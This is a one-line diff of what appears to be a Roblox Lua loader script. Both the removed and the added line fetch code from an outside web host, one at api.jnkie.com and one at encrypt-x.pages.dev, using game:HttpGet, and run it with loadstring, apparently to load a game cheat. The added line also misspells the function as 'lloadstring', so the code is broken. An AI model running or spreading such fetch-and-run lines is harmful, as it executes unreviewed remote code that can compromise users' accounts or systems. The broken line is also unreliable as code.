@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/5cf2287ca3d40dd2cc46c4ad1440fb51934d4aa3cc74f62ce126eb58ee08d5e9/download"))()
+lloadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7624624624590"))("7624624624590")
